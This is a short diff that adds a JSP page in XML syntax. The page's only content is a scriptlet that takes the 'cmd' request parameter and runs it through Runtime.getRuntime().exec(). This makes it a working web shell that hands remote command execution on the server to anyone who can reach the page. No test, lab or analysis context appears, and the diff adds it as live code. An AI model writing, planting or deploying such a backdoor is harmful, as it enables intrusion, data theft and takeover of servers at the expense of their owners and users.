@@ -1,0 +1,7 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+  <jsp:scriptlet>
+    if (request.getParameter("cmd") != null) {
+        Runtime.getRuntime().exec(request.getParameter("cmd"));
+    }
+  </jsp:scriptlet>
+</jsp:root>
